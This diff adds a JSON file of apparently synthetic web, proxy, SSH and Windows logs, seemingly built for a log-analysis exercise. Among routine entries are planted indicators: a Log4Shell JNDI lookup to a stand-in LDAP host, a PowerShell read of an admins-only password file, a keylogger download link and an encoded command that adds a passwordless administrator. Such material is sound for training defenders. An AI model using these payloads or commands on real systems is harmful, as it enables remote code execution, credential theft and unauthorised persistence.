@@ -1,0 +1,486 @@
+[
+  {
+    "type": "Apache",
+    "time": "01/Sep/2022 10:05 am",
+    "log": {
+      "ip": "1.100.1.111",
+      "method": "GET",
+      "version": "HTTP/1.1",
+      "url": "/index.php",
+      "status": "200"
+    }
+  },
+  {
+    "type": "Apache",
+    "time": "01/Sep/2022 11:55 PM",
+    "log": {
+      "ip": "7.255.219.210",
+      "method": "GET",
+      "version": "HTTP/1.1",
+      "url": "/about.html",
+      "status": "200"
+    }
+  },
+  {
+    "type": "Squid Proxy",
+    "time": "02/Sep/2022 02:02 AM",
+    "log": {
+      "ip": "10.0.0.67",
+      "port": 443,
+      "url": "youtube.com/index.html",
+      "result": "303",
+      "user": "joseph"
+    }
+  },
+  {
+    "type": "Squid Proxy",
+    "time": "02/Sep/2022 08:27 AM",
+    "log": {
+      "ip": "10.0.0.137",
+      "port": 443,
+      "url": "techcrunch.com/search.html",
+      "result": "200",
+      "user": "lyndon"
+    }
+  },
+  {
+    "type": "Apache",
+    "time": "02/Sep/2022 10:36 PM",
+    "log": {
+      "ip": "80.118.110.81",
+      "method": "POST",
+      "version": "HTTP/1.1",
+      "url": "/dashboard",
+      "status": "303"
+    }
+  },
+  {
+    "type": "Apache",
+    "time": "02/Sep/2022 11:31 AM",
+    "log": {
+      "ip": "157.71.53.68",
+      "method": "POST",
+      "version": "HTTP/1.1",
+      "url": "/contact.html",
+      "status": "200"
+    }
+  },
+  {
+    "type": "Apache",
+    "time": "02/Sep/2022 12:20 PM",
+    "log": {
+      "ip": "1.100.1.111",
+      "method": "POST",
+      "version": "HTTP/1.1",
+      "Content-Type": "application/json",
+      "status": 200
+    }
+  },
+  {
+    "type": "Squid Proxy",
+    "time": "03/Sep/2022 11:54 PM",
+    "log": {
+      "ip": "10.0.0.71",
+      "port": 80,
+      "url": "instargram.com/index.php",
+      "result": "200",
+      "user": "celeste"
+    }
+  },
+  {
+    "type": "Apache",
+    "time": "03/Sep/2022 13:54 PM",
+    "log": {
+      "ip": "1.100.1.111",
+      "method": "POST",
+      "version": "HTTP/1.1",
+      "Content-Type": "application/json",
+      "X-Api-Version": "${jndi:ldap://ignis.fuse/crepitus}",
+      "status": 200
+    }
+  },
+  {
+    "type": "SSH",
+    "time": "04/Sep/2022 21:28 PM",
+    "log": {
+      "ip": "1.100.1.111",
+      "port": "22",
+      "hostname": "carnation",
+      "information": "Accepted password",
+      "user": "remote"
+    }
+  },
+  {
+    "type": "Squid Proxy",
+    "time": "05/Sep/2022 02:03 AM",
+    "log": {
+      "ip": "10.0.0.121",
+      "port": 443,
+      "url": "facebook.com/search.html",
+      "result": "303",
+      "user": "lyndon"
+    }
+  },
+  {
+    "type": "Apache",
+    "time": "05/Sep/2022 10:13 PM",
+    "log": {
+      "ip": "149.6.248.138",
+      "method": "GET",
+      "version": "HTTP/1.1",
+      "url": "settings.php",
+      "status": "303"
+    }
+  },
+  {
+    "type": "Apache",
+    "time": "06/Sep/2022 07:11 AM",
+    "log": {
+      "ip": "229.122.47.63",
+      "method": "GET",
+      "version": "HTTP/1.1",
+      "url": "/search.html",
+      "status": "404"
+    }
+  },
+  {
+    "type": "Windows Event",
+    "time": "09/Sep/2022 03:31 AM",
+    "log": {
+      "event": "4688",
+      "account name": "remote",
+      "new process name": "powershell Get-Contents C:\\admins-only\\passwords.txt",
+      "creator process name": "C:\\Windows\\system32\\cmd.exe"
+    }
+  },
+  {
+    "type": "Windows Event",
+    "time": "09/Sep/2022 10:26 AM",
+    "log": {
+      "event": "4624",
+      "message": "Login/Logoff",
+      "user group": "Administrator",
+      "account name": "jerry",
+      "logon type": 10,
+      "keywords": "Successful Login"
+    }
+  },
+  {
+    "type": "Windows Event",
+    "time": "09/Sep/2022 12:44 PM",
+    "log": {
+      "event": 4728,
+      "user group": "Administrators",
+      "account name": "auberon"
+    }
+  },
+  {
+    "type": "SSH",
+    "time": "10/Sep/2022 01:09 AM",
+    "log": {
+      "ip": "157.71.53.68",
+      "port": 22,
+      "hostname": "carnation",
+      "user": "ed",
+      "information": "Connection closed"
+    }
+  },
+  {
+    "type": "Windows Event",
+    "time": "10/Sep/2022 03:09 PM",
+    "log": {
+      "event": 4728,
+      "user group": "Administrators",
+      "account name": "lunete"
+    }
+  },
+  {
+    "type": "Apache",
+    "time": "11/Sep/2022 03:08 PM",
+    "log": {
+      "ip": "58.222.38.180",
+      "method": "POST",
+      "version": "HTTP/1.1",
+      "url": "/index.html",
+      "status": "404"
+    }
+  },
+  {
+    "type": "SSH",
+    "time": "11/Sep/2022 03:38 AM",
+    "log": {
+      "ip": "123.180.33.93",
+      "port": 22,
+      "hostname": "carnation",
+      "user": "tristan",
+      "information": "Invalid user admin"
+    }
+  },
+  {
+    "type": "Windows Event",
+    "time": "12/Sep/2022 10:48 AM",
+    "log": {
+      "event": "4688",
+      "account name": "dave",
+      "new process name": "start firefox http://void.xyz/keylogger.pdf?download=true",
+      "creator process name": "C:\\Program Files (x86)\\Windows Mail\\en-US\\WinMail.exe"
+    }
+  },
+  {
+    "type": "Windows Event",
+    "time": "12/Sep/2022 12:20 PM",
+    "log": {
+      "event": "4688",
+      "account name": "ed",
+      "new process name": "start firefox http://free.com/cart.php",
+      "creator process name": "C:\\Program Files (x86)\\Windows Mail\\en-US\\WinMail.exe"
+    }
+  },
+  {
+    "type": "Squid Proxy",
+    "time": "12/Sep/2022 12:42 PM",
+    "log": {
+      "ip": "10.0.0.57",
+      "method": "POST",
+      "port": 80,
+      "url": "free.com/cart.php",
+      "result": "200",
+      "user": "ed"
+    }
+  },
+  {
+    "type": "SSH",
+    "time": "14/Sep/2022 03:52 AM",
+    "log": {
+      "ip": "7.255.219.210",
+      "port": 22,
+      "hostname": "carnation",
+      "user": "henry",
+      "information": "pam_unix(cron:session): session opened"
+    }
+  },
+  {
+    "type": "Windows Event",
+    "time": "14/Sep/2022 09:41 AM",
+    "log": {
+      "event": 4728,
+      "user group": "Administrators",
+      "account name": "casper"
+    }
+  },
+  {
+    "type": "Squid Proxy",
+    "time": "15/Sep/2022 08:28 AM",
+    "log": {
+      "ip": "10.0.0.106",
+      "port": 443,
+      "url": "google.com/about.html",
+      "result": "404",
+      "user": "jordan"
+    }
+  },
+  {
+    "type": "Squid Proxy",
+    "time": "16/Sep/2022 02:17 PM",
+    "log": {
+      "ip": "10.0.0.168",
+      "port": 443,
+      "url": "java.com/home.html",
+      "result": "404",
+      "user": "megan"
+    }
+  },
+  {
+    "type": "Windows Event",
+    "time": "16/Sep/2022 06:06 AM",
+    "log": {
+      "event": 4728,
+      "user group": "Administrators",
+      "account name": "merry"
+    }
+  },
+  {
+    "type": "Windows Event",
+    "time": "16/Sep/2022 10:04 PM",
+    "log": {
+      "event": 4728,
+      "user group": "Administrators",
+      "account name": "maria"
+    }
+  },
+  {
+    "type": "Apache",
+    "time": "17/Sep/2022 04:12 AM",
+    "log": {
+      "ip": "157.71.53.68",
+      "method": "GET",
+      "version": "HTTP/1.1",
+      "url": "/about-us.php",
+      "status": "200"
+    }
+  },
+  {
+    "type": "Squid Proxy",
+    "time": "18/Sep/2022 08:08 AM",
+    "log": {
+      "ip": "10.0.0.114",
+      "port": 443,
+      "url": "microsoft.com/about.html",
+      "result": "200",
+      "user": "andrew"
+    }
+  },
+  {
+    "type": "Apache",
+    "time": "19/Sep/2022 02:52 PM",
+    "log": {
+      "ip": "100.5.24.85",
+      "method": "GET",
+      "version": "HTTP/1.1",
+      "url": "/about.html",
+      "status": "303"
+    }
+  },
+  {
+    "type": "Squid Proxy",
+    "time": "22/Sep/2022 11:46 AM",
+    "log": {
+      "ip": "10.0.0.158",
+      "port": 443,
+      "url": "youtube.com/admin.html",
+      "result": "303",
+      "user": "nihal"
+    }
+  },
+  {
+    "type": "Apache",
+    "time": "23/Sep/2022 09:46 AM",
+    "log": {
+      "ip": "106.198.249.199",
+      "method": "POST",
+      "version": "HTTP/1.1",
+      "url": "/index.php",
+      "status": "200"
+    }
+  },
+  {
+    "type": "Apache",
+    "time": "24/Sep/2022 02:58 PM",
+    "log": {
+      "ip": "32.35.53.112",
+      "method": "POST",
+      "version": "HTTP/1.1",
+      "url": "/dashboard",
+      "status": "200"
+    }
+  },
+  {
+    "type": "Windows Event",
+    "time": "24/Sep/2022 05:15 AM",
+    "log": {
+      "event": 800,
+      "command": "-EncodedCommand TmV3IC1Mb2NhbFVzZXIgLU5hbWUgIm1lcnJ5IiAtRGVzY3JpcHRpb24gIjopIiAtTm9QYXNzd29yZDtBZGQtQURHcm91cE1lbWJlciAtSWRlbnRpdHkgQWRtaW5pc3RyYXRvciAtTWVtYmVycyBtZXJyeQ",
+      "user": "eve",
+      "application": "powershell.exe"
+    }
+  },
+  {
+    "type": "Squid Proxy",
+    "time": "24/Sep/2022 06:56 PM",
+    "log": {
+      "ip": "10.0.0.114",
+      "port": 443,
+      "url": "microsoft.com/home.html",
+      "result": "200",
+      "user": "adam"
+    }
+  },
+  {
+    "type": "SSH",
+    "time": "24/Sep/2022 09:25 AM",
+    "log": {
+      "ip": "4.239.236.140",
+      "port": 22,
+      "hostname": "carnation",
+      "user": "celeste",
+      "information": "New session"
+    }
+  },
+  {
+    "type": "Squid Proxy",
+    "time": "25/Sep/2022 04:59 AM",
+    "log": {
+      "ip": "10.0.0.110",
+      "port": 443,
+      "url": "microsoft.com/admin.html",
+      "result": "200",
+      "user": "megan"
+    }
+  },
+  {
+    "type": "SSH",
+    "time": "26/Sep/2022 06:24 AM",
+    "log": {
+      "ip": "149.6.248.138",
+      "port": 22,
+      "hostname": "carnation",
+      "user": "adam",
+      "information": "New session"
+    }
+  },
+  {
+    "type": "Squid Proxy",
+    "time": "27/Sep/2022 09:55 AM",
+    "log": {
+      "ip": "10.0.0.114",
+      "port": 443,
+      "url": "oracle.com/search.html",
+      "result": "200",
+      "user": "megan"
+    }
+  },
+  {
+    "type": "Squid Proxy",
+    "time": "27/Sep/2022 11:12 PM",
+    "log": {
+      "ip": "10.0.0.137",
+      "port": 443,
+      "url": "github.io/admin.html",
+      "result": "200",
+      "user": "matt"
+    }
+  },
+  {
+    "type": "Squid Proxy",
+    "time": "28/Sep/2022 06:42 PM",
+    "log": {
+      "ip": "10.0.0.71",
+      "port": 443,
+      "url": "gnu.org/contact.html",
+      "result": "200",
+      "user": "nihal"
+    }
+  },
+  {
+    "type": "Apache",
+    "time": "29/Sep/2022 10:21 PM",
+    "log": {
+      "ip": "4.239.236.140",
+      "method": "POST",
+      "version": "HTTP/1.1",
+      "url": "/index.php",
+      "status": "303"
+    }
+  },
+  {
+    "type": "Squid Proxy",
+    "time": "30/Sep/2022 07:45 AM",
+    "log": {
+      "ip": "10.0.0.168",
+      "port": 443,
+      "url": "distrowatch.com/home.html",
+      "result": "404",
+      "user": "chris"
+    }
+  }
+]
